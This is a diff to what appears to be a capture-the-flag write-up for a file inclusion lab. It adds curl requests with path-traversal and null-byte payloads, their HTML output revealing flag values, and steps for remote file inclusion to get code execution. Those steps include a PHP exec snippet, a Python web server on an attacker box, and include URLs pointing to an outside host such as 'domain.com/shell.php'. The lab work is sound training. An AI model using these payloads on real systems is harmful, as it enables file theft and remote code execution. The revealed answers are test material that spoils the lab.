@@ -300,7 +300,7 @@ Step 1
 
 ?file=http://domain.com/shell.php"
 ```
-http://10.10.136.249/playground.php??file=http://domain.com/shell.php
+http://10.10.136.249/playground.php?file=http://domain.com/shell.php
 ```
 
 Step 2 
@@ -396,17 +396,88 @@ http://10.10.136.249/challenges/chall1.php
 or 
 - open a command line and type
 ```
-curl -X POST http://10.10.136.249/challenges/chall1.php -d 'method=GET&file=/etc/flag1'
-
--X Request command
--d for data
+curl -X POST http://10.10.251.238/challenges/chall1.php -d 'method=GET&file=/etc/flag1'
+```
+- -X Request command
+- -d for data
 
 Note: 
-The first method "POST" tells how we want to send the request to the server
+- The first method "POST" tells how we want to send the request to the server
 
-The second method "GET" tells the server how to handle our request
+- The second method "GET" tells the server how to handle our request
+
+Output
 ```
 
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <title>Lab #Challenge-1</title>
+
+
+    <!-- Bootstrap core CSS -->
+    <link href="./css/bootstrap.min.css" rel="stylesheet">
+
+    <!-- Custom Stylesheet -->
+    <link href="./css/style.css" rel="stylesheet">
+
+    <!-- Core libraries bootstrap & jquery -->
+    <script src="./js/bootstrap5.min.js"></script>
+    <script src="./js/jquery-3.6.0.min.js"></script>
+
+    <!-- Custom JS code -->
+    <script src="./js/script.js"></script>
+
+  </head>
+
+    <header>
+<div class="container">
+  <ul class="nav">
+  	<li class="nav-item">
+    		<a class="nav-link" href="./index.php">Home</a>
+	</li>
+        <li class="nav-item">
+                <a class="nav-link">/</a>
+        </li>
+ 	<li class="nav-item">
+	<a class="nav-link active" >Lab #Challenge-1</a>
+        </li>
+  </ul>
+</div>
+    </header>
+<body>
+  <div class="container" style="padding-top: 5%;">
+      <h1 class="display-4">File Inclusion Lab</h1>
+      <p class="lead">Lab #Challenge-1: Include a file in the input form below
+<hr class="my-4">
+<div class="alert alert-warning" role="alert">
+  The input form is broken! You need to send `POST` request with `file` parameter!
+  </div>
+  <form action= "#" method="GET">
+          <div class="input-group mb-3">
+            <div class="input-group-prepend">
+              <span class="input-group-text">File Name</span>
+            </div>
+            <input name='file' type="text" class="form-control" placeholder="For example: welcome.php" aria-label="For example: welcome.php" aria-describedby="basic-addon2">
+            <div class="input-group-append">
+              <button class="btn btn-success" type="submit" >Include</button>
+            </div>
+          </div>
+        </form>
+
+        <div class='mt-5 mb-5'>
+          <h5>Current Path</h5>
+          <div class='file-Location'><code>/var/www/html</code></div>
+        </div>
+        <div>
+          <h5>File Content Preview of <b>/etc/flag1</b></h5>
+	  <code>F1x3d-iNpu7-f0rrn
+</code>
+    </div>  </body>
+</html>
+
+```
 
 
 
@@ -421,10 +492,192 @@ Capture Flag2 at /etc/flag2
 
 Answer : ****************
 
+Step 1 
+- open the url and select challenges 2
+```
+http://10.10.251.238/challenges/index.php
+```
+- open Burpsuite 
+- open FoxyProxy extension
+![img](/assets/img/fileInclusion14.png)
+
+
+
+
+
+
+
+
+--- 
 Capture Flag3 at /etc/flag3
 
 Answer : ****************
 
+
+```
+root@ip-10-10-204-185:~# 
+
+curl -X POST 10.10.197.165/challenges/chall3.php -d 'method=POST&file=....//....//....//....//etc/flag3%00' --output -
+```
+```
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <title>Lab #Challenge 3</title>
+
+
+    <!-- Bootstrap core CSS -->
+    <link href="./css/bootstrap.min.css" rel="stylesheet">
+
+    <!-- Custom Stylesheet -->
+    <link href="./css/style.css" rel="stylesheet">
+
+    <!-- Core libraries bootstrap & jquery -->
+    <script src="./js/bootstrap5.min.js"></script>
+    <script src="./js/jquery-3.6.0.min.js"></script>
+
+    <!-- Custom JS code -->
+    <script src="./js/script.js"></script>
+
+  </head>
+
+    <header>
+<div class="container">
+  <ul class="nav">
+  	<li class="nav-item">
+    		<a class="nav-link" href="./index.php">Home</a>
+	</li>
+        <li class="nav-item">
+                <a class="nav-link">/</a>
+        </li>
+ 	<li class="nav-item">
+	<a class="nav-link active" >Lab #Challenge 3</a>
+        </li>
+  </ul>
+</div>
+    </header>
+<body>
+  <div class="container" style="padding-top: 5%;">
+      <h1 class="display-4">File Inclusion Lab</h1>
+      <p class="lead">Lab #Challenge 3: Include a file in the input form below
+<hr class="my-4">
+	<form action= ".//chall3.php" method="GET">
+          <div class="input-group mb-3">
+            <div class="input-group-prepend">
+              <span class="input-group-text">File Name</span>
+            </div>
+            <input name='file' type="text" class="form-control" placeholder="For example: welcome" aria-label="For example: welcome" aria-describedby="basic-addon2">
+            <div class="input-group-append">
+              <button class="btn btn-success" type="submit" >Include</button>
+            </div>
+          </div>    
+        </form>
+	
+        <div class='mt-5 mb-5'>
+          <h5>Current Path</h5>
+          <div class='file-Location'><code>/var/www/html</code></div>
+        </div>
+        <div>
+          <h5>File Content Preview of <b>....//....//....//....//etc/flag3</b></h5>
+	  <code><br />
+<b>Warning</b>:  include(....//....//....//....//etc/flag3) [<a href='function.include'>function.include</a>]: failed to open stream: No such file or directory in <b>/var/www/html/chall3.php</b> on line <b>49</b><br />
+<br />
+<b>Warning</b>:  include() [<a href='function.include'>function.include</a>]: Failed opening '....//....//....//....//etc/flag3' for inclusion (include_path='.:/usr/lib/php5.2/lib/php') in <b>/var/www/html/chall3.php</b> on line <b>49</b><br />
+</code>
+    </div>  </body>
+</html>
+```
+```
+curl -X POST 10.10.197.165/challenges/chall3.php -d 'method=POST&file=../../../../etc/flag3%00' --output -
+```
+```
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <title>Lab #Challenge 3</title>
+
+
+    <!-- Bootstrap core CSS -->
+    <link href="./css/bootstrap.min.css" rel="stylesheet">
+
+    <!-- Custom Stylesheet -->
+    <link href="./css/style.css" rel="stylesheet">
+
+    <!-- Core libraries bootstrap & jquery -->
+    <script src="./js/bootstrap5.min.js"></script>
+    <script src="./js/jquery-3.6.0.min.js"></script>
+
+    <!-- Custom JS code -->
+    <script src="./js/script.js"></script>
+
+  </head>
+
+    <header>
+<div class="container">
+  <ul class="nav">
+  	<li class="nav-item">
+    		<a class="nav-link" href="./index.php">Home</a>
+	</li>
+        <li class="nav-item">
+                <a class="nav-link">/</a>
+        </li>
+ 	<li class="nav-item">
+	<a class="nav-link active" >Lab #Challenge 3</a>
+        </li>
+  </ul>
+</div>
+    </header>
+<body>
+  <div class="container" style="padding-top: 5%;">
+      <h1 class="display-4">File Inclusion Lab</h1>
+      <p class="lead">Lab #Challenge 3: Include a file in the input form below
+<hr class="my-4">
+	<form action= ".//chall3.php" method="GET">
+          <div class="input-group mb-3">
+            <div class="input-group-prepend">
+              <span class="input-group-text">File Name</span>
+            </div>
+            <input name='file' type="text" class="form-control" placeholder="For example: welcome" aria-label="For example: welcome" aria-describedby="basic-addon2">
+            <div class="input-group-append">
+              <button class="btn btn-success" type="submit" >Include</button>
+            </div>
+          </div>    
+        </form>
+	
+        <div class='mt-5 mb-5'>
+          <h5>Current Path</h5>
+          <div class='file-Location'><code>/var/www/html</code></div>
+        </div>
+        <div>
+          <h5>File Content Preview of <b>../../../../etc/flag3</b></h5>
+	  <code>P0st_1s_w0rk1in9
+</code>
+    </div>  </body>
+</html>
+
+```
+
+
+
+
+---
+
 Gain RCE in Lab #Playground /playground.php with RFI to execute the hostname command. What is the output?
 
-Answer : ***********************
+Answer : lfi-vm-thm-f8c5b1a78692
+
+
+- click on "Sublime text" icon
+- create a php file
+- Save the php file at root directory as cmd.txt
+
+```
+<?php print exec_('hostname'); ?>
+
+http://10.10.197.165/playground.php?file=http://domain.com/shell.php
+
+sudo python3 -m http.server
+
+http://10.10.197.165/playground.php?file=http://10.10.204.185:8000/cmd.txt
